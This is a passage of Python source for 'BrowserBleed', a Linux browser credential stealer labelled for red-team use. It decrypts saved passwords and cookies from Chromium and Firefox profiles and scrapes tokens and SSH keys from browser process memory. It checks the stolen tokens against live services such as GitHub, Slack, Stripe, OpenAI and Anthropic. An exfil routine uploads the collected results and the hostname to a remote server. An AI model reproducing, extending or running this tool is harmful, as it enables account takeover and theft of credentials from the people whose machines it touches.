    seen   = {(c["host"], c["name"]) for c in disk}
    merged = list(disk)
    for ck in cdp:
        key = (ck.get("host", ""), ck.get("name", ""))
        if key not in seen:
            ck["cdp_only"] = True
            merged.append(ck)
    return merged


# ── Service identification ─────────────────────────────────────────────────────
_CTX_URL_PAT    = re.compile(rb"https?://([a-zA-Z0-9][a-zA-Z0-9\-]*(?:\.[a-zA-Z0-9\-]+)+)")
_CTX_HOST_PAT   = re.compile(rb"Host:\s*([a-zA-Z0-9][a-zA-Z0-9\-]*(?:\.[a-zA-Z0-9\-]+)+)")
_CTX_DOMAIN_PAT = re.compile(rb'"(?:domain|iss|host|origin|issuer|audience)"\s*:\s*"([a-zA-Z0-9\-\./]+)"')
_CTX_COOKIE_DOM = re.compile(rb"[Dd]omain=\.?([a-zA-Z0-9][a-zA-Z0-9\-]*(?:\.[a-zA-Z0-9\-]+)+)")

_DOMAIN_SVC: list[tuple[str, str]] = [
    ("api.anthropic.com",              "Anthropic / Claude"),
    ("claude.ai",                      "Anthropic / Claude"),
    ("accounts.google.com",            "Google Accounts"),
    ("oauth2.googleapis.com",          "Google OAuth2"),
    ("identitytoolkit.googleapis.com", "Firebase Auth"),
    ("firebase.googleapis.com",        "Firebase / GCP"),
    ("googleapis.com",                 "Google API"),
    ("google.com",                     "Google"),
    ("api.github.com",                 "GitHub"),
    ("github.com",                     "GitHub"),
    ("raw.githubusercontent.com",      "GitHub"),
    ("api.slack.com",                  "Slack"),
    ("slack.com",                      "Slack"),
    ("api.openai.com",                 "OpenAI"),
    ("chat.openai.com",                "OpenAI"),
    ("openai.com",                     "OpenAI"),
    ("discord.com",                    "Discord"),
    ("discordapp.com",                 "Discord"),
    ("login.microsoftonline.com",      "Microsoft / Azure AD"),
    ("graph.microsoft.com",            "Microsoft Graph"),
    ("microsoftonline.com",            "Microsoft / Azure AD"),
    ("login.live.com",                 "Microsoft"),
    ("portal.azure.com",               "Azure Portal"),
    ("outlook.office365.com",          "Microsoft 365"),
    ("microsoft.com",                  "Microsoft"),
    ("appleid.apple.com",              "Apple ID"),
    ("idmsa.apple.com",                "Apple ID"),
    ("apple.com",                      "Apple"),
    ("api.notion.com",                 "Notion"),
    ("notion.so",                      "Notion"),
    ("gitlab.com",                     "GitLab"),
    ("api.digitalocean.com",           "DigitalOcean"),
    ("digitalocean.com",               "DigitalOcean"),
    ("auth0.com",                      "Auth0"),
    ("okta.com",                       "Okta"),
    ("cognito-idp",                    "AWS Cognito"),
    ("amazonaws.com",                  "AWS"),
    ("api.stripe.com",                 "Stripe"),
    ("stripe.com",                     "Stripe"),
    ("atlassian.net",                  "Atlassian"),
    ("atlassian.com",                  "Atlassian"),
    ("api.figma.com",                  "Figma"),
    ("figma.com",                      "Figma"),
    ("api.linear.app",                 "Linear"),
    ("linear.app",                     "Linear"),
    ("api.vercel.com",                 "Vercel"),
    ("vercel.com",                     "Vercel"),
    ("api.twilio.com",                 "Twilio"),
    ("twilio.com",                     "Twilio"),
    ("clerk.com",                      "Clerk"),
    ("clerk.dev",                      "Clerk"),
    ("supabase.co",                    "Supabase"),
    ("supabase.com",                   "Supabase"),
    ("ollama.com",                     "Ollama"),
    ("netlify.com",                    "Netlify"),
    ("heroku.com",                     "Heroku"),
    ("pingidentity.com",               "PingIdentity"),
    ("onelogin.com",                   "OneLogin"),
    ("salesforce.com",                 "Salesforce"),
    ("api.twitter.com",                "Twitter / X"),
    ("api.x.com",                      "Twitter / X"),
    ("twitter.com",                    "Twitter / X"),
    ("x.com",                          "Twitter / X"),
    ("api.linkedin.com",               "LinkedIn"),
    ("linkedin.com",                   "LinkedIn"),
    ("graph.facebook.com",             "Meta Graph API"),
    ("facebook.com",                   "Meta"),
    ("instagram.com",                  "Instagram"),
    ("app.datadoghq.com",              "Datadog"),
    ("datadoghq.com",                  "Datadog"),
    ("registry.npmjs.org",             "npm"),
    ("npmjs.com",                      "npm"),
    ("api.cloudflare.com",             "Cloudflare"),
    ("cloudflare.com",                 "Cloudflare"),
    ("app.terraform.io",               "HashiCorp Cloud"),
    ("cloud.hashicorp.com",            "HashiCorp Cloud"),
    ("vault.hashicorp.com",            "HashiCorp Vault"),
    ("api.sendgrid.com",               "SendGrid"),
    ("sendgrid.com",                   "SendGrid"),
]

_ISS_MAP = [
    ("accounts.google.com", "Google"),
    ("github.com",          "GitHub"),
    ("microsoftonline.com", "Microsoft / Azure AD"),
    ("login.microsoft.com", "Microsoft / Azure AD"),
    ("apple.com",           "Apple"),
    ("cognito-idp",         "AWS Cognito"),
    ("auth0.com",           "Auth0"),
    ("okta.com",            "Okta"),
    ("clerk",               "Clerk"),
    ("supabase",            "Supabase"),
    ("firebase",            "Firebase / GCP"),
    ("anthropic",           "Anthropic / Claude"),
    ("claude.ai",           "Anthropic / Claude"),
    ("ollama.com",          "Ollama"),
    ("discord.com",         "Discord"),
    ("atlassian",           "Atlassian"),
    ("salesforce",          "Salesforce"),
    ("onelogin",            "OneLogin"),
    ("pingidentity",        "PingIdentity"),
]

_KID_MAP: list[tuple[re.Pattern, str]] = [
    (re.compile(r"^key-\d+$"), "Google"),
]

_oidc_cache: dict[str, str | None] = {}


def _domain_matches(frag: str, domain: str) -> bool:
    if "." in frag:
        return domain == frag or domain.endswith(f".{frag}")
    return domain.startswith(f"{frag}.") or domain == frag


def _service_from_context(context: bytes) -> str | None:
    candidates: list[str] = []
    for pat in (_CTX_URL_PAT, _CTX_HOST_PAT, _CTX_DOMAIN_PAT, _CTX_COOKIE_DOM):
        for m in pat.finditer(context):
            try:
                domain = m.group(1).decode(errors="replace").lower().strip("/").split(":")[0]
                if "." in domain and 4 < len(domain) < 128:
                    candidates.append(domain)
            except Exception:
                pass
    for domain in candidates:
        for frag, svc in _DOMAIN_SVC:
            if _domain_matches(frag, domain):
                return svc
    return None


def _decode_jwt_claims(token: str) -> dict:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return {}
        pad = parts[1] + "=" * (4 - len(parts[1]) % 4)
        return json.loads(base64.b64decode(pad.replace("-", "+").replace("_", "/")))
    except Exception:
        return {}


def _decode_jwt_header(token: str) -> dict:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return {}
        pad = parts[0] + "=" * (4 - len(parts[0]) % 4)
        return json.loads(base64.b64decode(pad.replace("-", "+").replace("_", "/")))
    except Exception:
        return {}


def _http_get(url: str, headers: dict | None = None, timeout: int = 6) -> tuple[int, dict]:
    _headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"}
    if headers:
        _headers.update(headers)
    req = urllib.request.Request(url, headers=_headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, json.loads(resp.read().decode(errors="replace"))
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read().decode(errors="replace"))
        except Exception:
            return e.code, {}
    except Exception as e:
        return 0, {"_error": str(e)}


def _oidc_discover(issuer_url: str) -> str | None:
    if not _do_oidc:
        return None
    if issuer_url in _oidc_cache:
        return _oidc_cache[issuer_url]
    result = None
    try:
        base = re.match(r"https?://[^/]+", issuer_url)
        url  = (base.group() if base else issuer_url.rstrip("/")) + "/.well-known/openid-configuration"
        status, data = _http_get(url, timeout=3)
        if status == 200:
            iss_field = data.get("issuer", "")
            m = re.search(r"https?://([^/]+)", iss_field)
            if m:
                domain = m.group(1).lower()
                for frag, svc_name in _DOMAIN_SVC:
                    if _domain_matches(frag, domain):
                        result = svc_name
                        break
                if result is None:
                    result = domain
    except Exception:
        pass
    _oidc_cache[issuer_url] = result
    return result


def identify_service(label: str, value: str, context: bytes = b"") -> str:
    v = value[7:] if value.startswith("Bearer ") else value
    if v is value and value.startswith("Basic "):
        v = value[6:]

    if label == "AWS Access Key":     return "AWS"
    if label == "Anthropic API key":  return "Anthropic / Claude"
    if label == "Stripe key":         return "Stripe"
    if label == "npm token":          return "npm"
    if label == "HuggingFace token":  return "HuggingFace"
    if label == "Vault token":        return "HashiCorp Vault"
    if label == "SSH private key":    return "SSH Key"
    if label == "Google SAPISID":     return "Google (YouTube / Gmail)"
    if label == "Discord token":      return "Discord"
    if label == "Slack token":        return "Slack"
    if label == "GitHub token":       return "GitHub"

    if v.startswith("ya29."):         return "Google OAuth2"
    if v[:4] in ("QUFL", "QUJF", "QUEy", "QUFF"): return "Google OAuth2"
    gh_types = {"ghp_": "personal", "gho_": "OAuth app", "ghu_": "user-to-server",
                "ghs_": "server-to-server", "ghr_": "refresh"}
    if v[:4] in gh_types:             return f"GitHub ({gh_types[v[:4]]})"
    slack_map = {"xoxb": "bot token", "xoxp": "user token", "xoxa": "app token",
                 "xoxr": "refresh",   "xoxs": "service token"}
    if v[:4] in slack_map:            return f"Slack ({slack_map[v[:4]]})"
    if v.startswith("sk-ant-"):       return "Anthropic / Claude"
    if v.startswith("sk-"):           return "OpenAI"
    if v.startswith("glpat-"):        return "GitLab"
    if v.startswith("dp."):           return "DigitalOcean"
    if v.startswith("pat_"):          return "Notion"
    if v.startswith("hf_"):           return "HuggingFace"
    if v.startswith("hvs."):          return "HashiCorp Vault"
    if v.startswith("npm_"):          return "npm"
    if v.startswith("sk_live_") or v.startswith("sk_test_"): return "Stripe"
    if re.match(r"^20111[A-Za-z0-9\-_]{20,}$", v):          return "Anthropic / Claude"

    if label == "JWT token" or (v.startswith("eyJ") and v.count(".") == 2):
        header = _decode_jwt_header(v)
        kid    = str(header.get("kid", ""))
        for pat, svc in _KID_MAP:
            if pat.match(kid):
                return f"JWT - {svc}"
        claims   = _decode_jwt_claims(v)
        iss      = str(claims.get("iss", ""))
        aud      = claims.get("aud", "")
        if isinstance(aud, list):
            aud = " ".join(str(a) for a in aud)
        combined = f"{iss} {aud}".lower()
        for pattern, name in _ISS_MAP:
            if pattern in combined:
                return f"JWT - {name}"
        m = re.search(r"https?://([^/\s]+)", iss)
        if m:
            discovered = _oidc_discover(iss)
            if discovered:
                return f"JWT - {discovered}"
            return f"JWT - {m.group(1)}"
        if iss:
            return f"JWT - {iss[:50]}"
        for claim_val in claims.values():
            if not isinstance(claim_val, str) or not claim_val.startswith("http"):
                continue
            cm = re.search(r"https?://([^/\s?#]+)", claim_val)
            if not cm:
                continue
            domain = cm.group(1).lower()
            for frag, svc_name in _DOMAIN_SVC:
                if _domain_matches(frag, domain):
                    return f"JWT - {svc_name}"
            return f"JWT - {domain}"
        if context:
            svc = _service_from_context(context)
            if svc:
                return f"JWT - {svc}"
        return "JWT - unknown issuer"

    if context:
        svc = _service_from_context(context)
        if svc:
            return svc

    return "Unknown service"


# ── Token verification ─────────────────────────────────────────────────────────
def verify_google_oauth(token: str) -> dict:
    status, data = _http_get(f"https://oauth2.googleapis.com/tokeninfo?access_token={token}")
    if status == 200:
        scope       = data.get("scope", "")
        scope_short = " ".join(s.split("/")[-1] for s in scope.split())[:80]
        return {"valid": True, "email": data.get("email", data.get("sub", "?")),
                "expires_in": f"{data.get('expires_in', '?')}s", "scope": scope_short or "?"}
    return {"valid": False, "reason": data.get("error_description", f"HTTP {status}")}


def verify_github(token: str) -> dict:
    status, data = _http_get(
        "https://api.github.com/user",
        headers={"Authorization": f"Bearer {token}", "Accept": "application/vnd.github.v3+json"},
    )
    if status == 200:
        return {"valid": True, "user": data.get("login", "?"), "name": data.get("name", "?")}
    return {"valid": False, "reason": data.get("message", f"HTTP {status}")}


def verify_slack(token: str) -> dict:
    req = urllib.request.Request(
        "https://slack.com/api/auth.test",
        data=b"{}",
        headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json",
                 "User-Agent": "Mozilla/5.0"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=6) as resp:
            data = json.loads(resp.read())
        if data.get("ok"):
            return {"valid": True, "user": data.get("user", "?"), "team": data.get("team", "?")}
        return {"valid": False, "reason": data.get("error", "unknown")}
    except Exception as e:
        return {"valid": False, "reason": str(e)}


def verify_jwt(token: str) -> dict:
    claims = _decode_jwt_claims(token)
    if not claims:
        return {"valid": None, "reason": "could not decode payload"}
    exp = claims.get("exp")
    if exp:
        exp_dt = datetime.fromtimestamp(exp, tz=timezone.utc)
        now    = datetime.now(tz=timezone.utc)
        secs   = int((exp_dt - now).total_seconds())
        if secs > 0:
            h, m = divmod(secs // 60, 60)
            return {"valid": True, "expires": exp_dt.strftime("%Y-%m-%d %H:%M UTC"), "ttl": f"{h}h {m}m"}
        return {"valid": False, "reason": f"expired {exp_dt.strftime('%Y-%m-%d %H:%M UTC')}"}
    return {"valid": None, "reason": "no exp claim"}


def verify_anthropic(token: str) -> dict:
    if re.match(r"^20111[A-Za-z0-9\-_]{20,}$", token):
        status, data = _http_get(
            "https://claude.ai/api/organizations",
            headers={"Cookie": f"sessionKey={token}"},
        )
        if status == 200:
            orgs  = data if isinstance(data, list) else []
            names = [o.get("name", "?") for o in orgs[:3]]
            return {"valid": True, "orgs": ", ".join(names) or "?"}
        return {"valid": False, "reason": f"HTTP {status}"}
    status, data = _http_get(
        "https://api.anthropic.com/v1/models",
        headers={"x-api-key": token, "anthropic-version": "2023-06-01"},
    )
    if status == 200:
        models = [m.get("id", "?") for m in data.get("data", [])[:3]]
        return {"valid": True, "models_visible": ", ".join(models) or "?"}
    err = data.get("error", {})
    return {"valid": False, "reason": err.get("message", f"HTTP {status}") if isinstance(err, dict) else f"HTTP {status}"}


def verify_openai(token: str) -> dict:
    status, data = _http_get(
        "https://api.openai.com/v1/models",
        headers={"Authorization": f"Bearer {token}"},
    )
    if status == 200:
        models = [m.get("id", "?") for m in data.get("data", [])[:3]]
        return {"valid": True, "models_visible": ", ".join(models) or "?"}
    err    = data.get("error", {})
    return {"valid": False, "reason": err.get("message", f"HTTP {status}") if isinstance(err, dict) else f"HTTP {status}"}


def verify_stripe(token: str) -> dict:
    status, data = _http_get(
        "https://api.stripe.com/v1/balance",
        headers={"Authorization": f"Bearer {token}"},
    )
    if status == 200:
        avail    = data.get("available", [{}])
        currency = avail[0].get("currency", "?").upper() if avail else "?"
        amount   = avail[0].get("amount", "?") if avail else "?"
        return {"valid": True, "balance": f"{amount} {currency}"}
    err = data.get("error", {})
    return {"valid": False, "reason": err.get("message", f"HTTP {status}") if isinstance(err, dict) else f"HTTP {status}"}


def verify_aws(access_key: str) -> dict:
    try:
        req = urllib.request.Request(
            "https://sts.amazonaws.com/",
            data=b"Action=GetCallerIdentity&Version=2011-06-15",
            headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=6):
                return {"valid": None, "reason": "unexpected 200 without signing"}
        except urllib.error.HTTPError as e:
            if e.code == 403:
                return {"valid": None, "reason": "key ID exists (403 auth failed - no secret key available)"}
            return {"valid": False, "reason": f"HTTP {e.code}"}
    except Exception as ex:
        return {"valid": None, "reason": str(ex)}


def verify_hit(label: str, value: str, service: str) -> dict | None:
    raw = value.split()[-1] if value.startswith("Bearer ") else value
    if "Google OAuth2" in service or raw.startswith("ya29."):
        return verify_google_oauth(raw)
    if "GitHub" in service:
        return verify_github(raw)
    if "Slack" in service:
        return verify_slack(raw)
    if "Anthropic" in service:
        return verify_anthropic(raw)
    if "OpenAI" in service or raw.startswith("sk-"):
        return verify_openai(raw)
    if "Stripe" in service or raw.startswith("sk_live_") or raw.startswith("sk_test_"):
        return verify_stripe(raw)
    if label == "AWS Access Key":
        return verify_aws(raw)
    if label == "JWT token":
        return verify_jwt(raw)
    return None


def _fmt_verify(result: dict) -> str:
    if result.get("valid") is True:
        parts = "  |  ".join(f"{k}: {v}" for k, v in result.items() if k != "valid")
        return f"[VALID] {parts}"
    if result.get("valid") is False:
        return f"[INVALID] {result.get('reason', '?')}"
    return f"[?] {result.get('reason', '?')}"


# ── Per-browser processing ─────────────────────────────────────────────────────
def process_browser(name: str, process_name: str, user_data_path: str,
                    do_disk: bool, do_memory: bool, max_hits: int,
                    do_verify: bool = False) -> tuple[list[str], list[dict]]:
    lines    = []
    csv_rows: list[dict] = []
    alt_names = _CHROMIUM_ALT_NAMES.get(process_name, [process_name])
    running   = any(is_process_running(n) for n in alt_names)

    lines.append("\n" + "=" * 70)
    lines.append(f"  BROWSER: {name}  [{'RUNNING' if running else 'closed'}]")
    lines.append("=" * 70)

    if not os.path.exists(user_data_path):
        lines.append("  [--] Not installed\n")
        return lines, csv_rows

    # ── Disk ──────────────────────────────────────────────────────────────────
    if do_disk:
        try:
            key = get_encryption_key(user_data_path)
            lines.append(f"[+] Encryption key derived")
        except Exception as e:
            lines.append(f"[-] Key derivation failed: {e}")
            key = None

        if key:
            profiles = _get_profiles(user_data_path)
            if not profiles:
                lines.append("  [--] No profiles found (browser installed but never launched?)")
            for prof_label, prof_path in profiles:
                lines.append(f"\n  ── Profile: {prof_label} ──")

                lines.append("\n  -- [DISK] Saved Credentials --")
                try:
                    creds = extract_credentials(prof_path, key)
                    if creds:
                        lines.append(f"[+] {len(creds)} credential(s)\n")
                        for c in creds:
                            lines.append(f"  URL:      {c['url']}")
                            lines.append(f"  Username: {c['username']}")
                            lines.append(f"  Password: {c['password']}\n")
                            csv_rows.append({
                                "browser": name, "profile": prof_label,
                                "label": "Saved Credential", "service": urllib.parse.urlparse(c["url"]).netloc or c["url"],
                                "value": f"{c['username']}:{c['password']}", "address": c["url"],
                            })
                    else:
                        lines.append("  [-] None found")
                except Exception as e:
                    lines.append(f"  [-] {e}")

                lines.append("\n  -- [DISK] Cookies --")
                disk_cookies: list[dict] = []
                disk_cookie_err: str | None = None
                try:
                    disk_cookies = extract_cookies(prof_path, key)
                except Exception as e:
                    disk_cookie_err = str(e)

                cdp_cookies: list[dict] = []
                if running:
                    try:
                        cdp_cookies = extract_cookies_cdp(process_name)
                    except Exception:
                        pass

                if disk_cookies or cdp_cookies:
                    merged         = _merge_cdp_cookies(disk_cookies, cdp_cookies)
                    cdp_only_count = sum(1 for c in merged if c.get("cdp_only"))
                    lines.append(
                        f"[+] {len(merged)} cookie(s)"
                        + (f"  ({cdp_only_count} CDP-only)" if cdp_only_count else "")
                        + "\n"
                    )
                    for ck in merged:
                        cdp_tag  = "  [CDP-only]" if ck.get("cdp_only") else ""
                        samesite = ck.get("samesite", "?")
                        lines.append(f"  Host:     {ck['host']}{cdp_tag}")
                        lines.append(f"  Name:     {ck['name']}")
                        lines.append(f"  Value:    {ck['value']}")
                        lines.append(f"  Expires:  {ck['expires']}  Secure:{ck['secure']}  HttpOnly:{ck['httponly']}  SameSite:{samesite}\n")
                        csv_rows.append({
                            "browser": name, "profile": prof_label,
                            "label": "Cookie" + (" [CDP]" if ck.get("cdp_only") else ""),
                            "service": ck["host"],
                            "value": f"{ck['name']}={ck['value']}",
                            "address": ck["host"],
                        })
                else:
                    if disk_cookie_err:
                        lines.append(f"  [-] {disk_cookie_err}")
                    else:
                        lines.append("  [-] None found")
                    if running and not cdp_cookies:
                        lines.append("  [-] CDP unavailable (Chrome not started with --remote-debugging-port)")

    # ── Memory ────────────────────────────────────────────────────────────────
    lines.append("\n  -- [MEMORY] Live Scrape --")
    if not do_memory:
        lines.append("  [--] Skipped (--disk-only)")
        return lines, csv_rows
    if not running:
        lines.append("  [--] Browser not running")
        return lines, csv_rows

    all_pids: list[int] = []
    for n in alt_names:
        all_pids.extend(find_pids(n))
    all_pids  = list(set(all_pids))
    pid_sites = _pid_site_map(process_name)
    all_hits: list[dict] = []
    errors:   list[str]  = []

    def _scrape_pid(pid: int) -> list[dict]:
        hits     = scrape_pid(pid, max_hits=max_hits)
        site_url = pid_sites.get(pid, "")
        if site_url:
            url_bytes = f" {site_url} ".encode()
            for h in hits:
                h["context"] = h.get("context", b"") + url_bytes
        return hits

    with ThreadPoolExecutor(max_workers=min(max(len(all_pids), 1), 8)) as pool:
        futures = {pool.submit(_scrape_pid, pid): pid for pid in all_pids}
        for future in as_completed(futures):
            pid = futures[future]
            try:
                all_hits.extend(future.result())
            except PermissionError as e:
                errors.append(f"PID {pid}: {e}")
            except Exception as e:
                errors.append(f"PID {pid}: {e}")

    for e in errors:
        lines.append(f"  [-] {e}")

    unique_hits = deduplicate(all_hits)
    raw_count   = len(all_hits)

    if not unique_hits:
        lines.append("  [-] No hits found")
        return lines, csv_rows

    lines.append(
        f"[+] {len(unique_hits)} unique hit(s)"
        + (f"  ({raw_count} raw across {len(all_pids)} PIDs, {raw_count - len(unique_hits)} dupes removed)"
           if raw_count > len(unique_hits) else f"  (across {len(all_pids)} PID(s))")
    )
    lines.append("")

    for h in unique_hits:
        if "_svc" not in h:
            h["_svc"] = identify_service(h["label"], h["value"], h.get("context", b""))

    for h in unique_hits:
        csv_rows.append({
            "browser": name, "profile": "(memory)",
            "label":   h["label"], "service": h["_svc"],
            "value":   h["value"], "address": h.get("address", ""),
        })

    by_label: dict[str, list[dict]] = {}
    for h in unique_hits:
        by_label.setdefault(h["label"], []).append(h)

    COL_TYPE = 22
    COL_SVC  = 28

    prev_label = None
    for label in sorted(by_label, key=lambda l: (_HIT_TIER.get(l, 1), l)):
        group = by_label[label]
        tier  = _HIT_TIER.get(label, 1)
        if prev_label is not None:
            lines.append("")
        prev_label = label
        if tier == 2:
            svc_counts: dict[str, int] = {}
            for h in group:
                svc_counts[h["_svc"]] = svc_counts.get(h["_svc"], 0) + 1
            svc_summary = "  ".join(f"{s} ({c})" for s, c in sorted(svc_counts.items()))
            lines.append(f"  {label}  ({len(group)} unique)  -  {svc_summary}")
            continue
        for h in group:
            svc = h["_svc"]
            if label == "SSH private key":
                lines.append(f"  {'SSH private key':<{COL_TYPE}}  {svc:<{COL_SVC}}")
                for kline in h["value"].replace("\r\n", "\n").replace("\r", "\n").split("\n"):
                    lines.append(f"    {kline}")
            else:
                val = _trunc(h["value"].replace("\n", "\\n").replace("\r", "\\r"))
                lines.append(f"  {label[:COL_TYPE]:<{COL_TYPE}}  {svc[:COL_SVC]:<{COL_SVC}}  {val}")
            if do_verify:
                result = verify_hit(label, h["value"], h["_svc"])
                lines.append(f"    └─ {_fmt_verify(result) if result else '[NO VERIFIER]'}")

    return lines, csv_rows


# ── Exfil ─────────────────────────────────────────────────────────────────────
def _exfil_results(url: str, api_key: str, txt_path: str, csv_path: str | None) -> str:
    import ssl
    import platform

    boundary = b"BrowserBleedBoundary7MA4YWxkTrZu0gW"

    def _field(name: str, value: str) -> bytes:
        return (b"--" + boundary + b"\r\n"
                b'Content-Disposition: form-data; name="' + name.encode() + b'"\r\n\r\n'
                + value.encode() + b"\r\n")

    def _file_field(name: str, filename: str, data: bytes) -> bytes:
        return (b"--" + boundary + b"\r\n"
                b'Content-Disposition: form-data; name="' + name.encode()
                + b'"; filename="' + filename.encode() + b'"\r\n'
                b"Content-Type: application/octet-stream\r\n\r\n"
                + data + b"\r\n")

    try:
        body = _field("hostname", platform.node())
        with open(txt_path, "rb") as f:
            body += _file_field("txt", "results.txt", f.read())
        if csv_path and os.path.exists(csv_path):
            with open(csv_path, "rb") as f:
                body += _file_field("csv", "results.csv", f.read())
        body += b"--" + boundary + b"--\r\n"

        parsed = urllib.parse.urlparse(url.rstrip("/"))
        ctx    = ssl.create_default_context()
        conn   = http.client.HTTPSConnection(parsed.netloc, context=ctx, timeout=30)
        conn.request("POST", "/upload", body=body, headers={
            "Authorization": f"Bearer {api_key}",
            "Content-Type":  f"multipart/form-data; boundary={boundary.decode()}",
        })
        resp = conn.getresponse()
        raw  = resp.read()
        conn.close()
        try:
            result_url = json.loads(raw).get("url", "")
        except Exception:
            result_url = ""
        return result_url
    except Exception as _e:
        try:
            _log = os.path.join(tempfile.gettempdir(), "bb_exfil_err.txt")
            with open(_log, "w", encoding="utf-8") as _lf:
                _lf.write(f"{type(_e).__name__}: {_e}\n")
        except Exception:
            pass
        return ""


# ── Main ───────────────────────────────────────────────────────────────────────
def main():
    global _do_oidc

    parser = argparse.ArgumentParser(
        description="BrowserBleed - Browser Credential Extractor (Linux). Authorized use only."
    )
    parser.add_argument("--browser",     metavar="NAME", help="Target one browser (e.g. chrome, brave, edge)")
    parser.add_argument("--disk-only",   action="store_true", help="Skip memory scraping")
    parser.add_argument("--memory-only", action="store_true", help="Skip disk extraction")
    parser.add_argument("--out",         metavar="PATH",      help="Output file path")
    parser.add_argument("--max-hits",    type=int, default=300, help="Max memory hits per browser before dedup (default: 300)")
    parser.add_argument("--verify",      action="store_true", help="Verify tokens against their services (outbound requests)")
    parser.add_argument("--exfil",       metavar="URL", default=_EXFIL_URL or None, help="POST results to report server")
    parser.add_argument("--exfil-key",   metavar="KEY", default=_EXFIL_KEY or None, help="API key for --exfil")
    args = parser.parse_args()

    if args.verify:
        _do_oidc = True

    do_disk   = not args.memory_only
    do_memory = not args.disk_only

    lines = [
        "=" * 70,
        "  BrowserBleed - Browser Credential & Token Extractor (Linux)",
        "  Authorized Red Team Use Only",
        f"  Run:  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"  Root: {'YES' if is_root() else 'NO  (run as root for full process memory access)'}",
        f"  User: {os.environ.get('SUDO_USER', os.environ.get('USER', '?'))}",
        f"  Home: {HOME}",
        f"  Host: {os.uname().nodename}",
        f"  Modes: {'DISK ' if do_disk else ''}{'MEMORY' if do_memory else ''}",
        "=" * 70,
    ]

    if not is_root() and do_memory:
        lines.append("[!] Not running as root - /proc/<pid>/mem reads will fail on most systems")
        lines.append("[!] Run with: sudo ./BrowserBleed_linux")

    # ── Environment diagnostics ───────────────────────────────────────────────
    lines.append("\n  -- [DIAG] Environment --")
    lines.append(f"  Python:    {sys.version.split()[0]}")
    lines.append(f"  Frozen:    {getattr(sys, 'frozen', False)}")
    lines.append(f"  CWD:       {os.getcwd()}")
    try:
        import platform
        lines.append(f"  OS:        {platform.platform()}")
    except Exception:
        pass

    lines.append("\n  -- [DIAG] Browser paths --")
    for bname, proc, bpath in BROWSERS:
        exists   = os.path.isdir(bpath)
        running  = any(is_process_running(n) for n in _CHROMIUM_ALT_NAMES.get(proc, [proc]))
        pids     = []
        for n in _CHROMIUM_ALT_NAMES.get(proc, [proc]):
            pids.extend(find_pids(n))
        status = ("INSTALLED" if exists else "not found") + ("  RUNNING (PIDs: " + ",".join(map(str, set(pids))) + ")" if running else "")
        lines.append(f"  {bname:<20} {status}")
        if exists:
            lines.append(f"    path: {bpath}")

    for ff_name, ff_procs, ff_paths in _FIREFOX_SPECS:
        ff_dir = _resolve_firefox_spec(ff_paths)
        ff_pids_diag: list[int] = []
        for pn in ff_procs:
            ff_pids_diag.extend(find_pids(pn))
        ff_pids_diag = list(set(ff_pids_diag))
        ff_run_diag  = bool(ff_pids_diag)
        status = ("INSTALLED" if ff_dir else "not found") + (
            "  RUNNING (PIDs: " + ",".join(map(str, ff_pids_diag)) + ")" if ff_run_diag else "")
        lines.append(f"  {ff_name:<20} {status}")
        if ff_dir:
            lines.append(f"    path: {ff_dir}")

    targets = BROWSERS
    if args.browser:
        bf      = args.browser.lower()
        targets = [(n, p, u) for n, p, u in BROWSERS if bf in n.lower() or bf in p.lower()]
        if not targets:
            lines.append(f"\n[!] No browser matched '{args.browser}'")

    all_csv_rows: list[dict] = []
    with ThreadPoolExecutor(max_workers=4) as executor:
        future_map = {
            executor.submit(
                process_browser, bname, proc, path, do_disk, do_memory, args.max_hits, args.verify
            ): bname
            for bname, proc, path in targets
        }
        results_by_name: dict[str, tuple[list[str], list[dict]]] = {}
        for future in as_completed(future_map):
            bname = future_map[future]
            try:
                results_by_name[bname] = future.result()
            except Exception as e:
                results_by_name[bname] = ([f"\n[!] {bname} error: {e}"], [])

    for bname, proc, path in targets:
        browser_lines, browser_csv = results_by_name.get(bname, ([], []))
        lines.extend(browser_lines)
        all_csv_rows.extend(browser_csv)

    # Firefox-family browsers (Firefox, LibreWolf, Waterfox, Tor Browser)
    ff_family = extract_all_firefox_family()

    for ff_name, ff_procs, ff_profiles_dir, ff_cookies in ff_family:
        ff_pids = list(set(p for pn in ff_procs for p in find_pids(pn)))
        ff_running = bool(ff_pids)

        lines.append("\n" + "=" * 70)
        lines.append(f"  BROWSER: {ff_name}  [{'RUNNING' if ff_running else 'closed'}]")
        lines.append("=" * 70)

        if not ff_profiles_dir:
            lines.append("  [--] Not installed\n")
            continue

        if do_disk:
            lines.append("\n  -- [DISK] Cookies --")
            if ff_cookies:
                lines.append(f"[+] {len(ff_cookies)} cookie(s) across all profiles\n")
                for ck in ff_cookies:
                    lines.append(f"  Profile:  {ck.get('profile', '?')}")
                    lines.append(f"  Host:     {ck['host']}")
                    lines.append(f"  Name:     {ck['name']}")
                    lines.append(f"  Value:    {ck['value']}")
                    lines.append(f"  Expires:  {ck['expires']}  Secure:{ck['secure']}  HttpOnly:{ck['httponly']}  SameSite:{ck.get('samesite', '?')}\n")
                    all_csv_rows.append({
                        "browser": ff_name, "profile": ck.get("profile", "?"),
                        "label": "Cookie", "service": ck["host"],
                        "value": f"{ck['name']}={ck['value']}", "address": ck["host"],
                    })
            else:
                lines.append("  [-] No cookies found")

        lines.append("\n  -- [MEMORY] Live Scrape --")
        if not do_memory:
            lines.append("  [--] Skipped (--disk-only)")
        elif not ff_running:
            lines.append("  [--] Browser not running")
        else:
            ff_hits: list[dict] = []
            ff_errors: list[str] = []
            with ThreadPoolExecutor(max_workers=min(len(ff_pids), 8)) as pool:
                futures = {pool.submit(scrape_pid, pid, args.max_hits): pid for pid in ff_pids}
                for future in as_completed(futures):
                    pid = futures[future]
                    try:
                        ff_hits.extend(future.result())
                    except PermissionError as e:
                        ff_errors.append(f"PID {pid}: {e}")
                    except Exception as e:
                        ff_errors.append(f"PID {pid}: {e}")
            for e in ff_errors:
                lines.append(f"  [-] {e}")
            unique_ff = deduplicate(ff_hits)
            if not unique_ff:
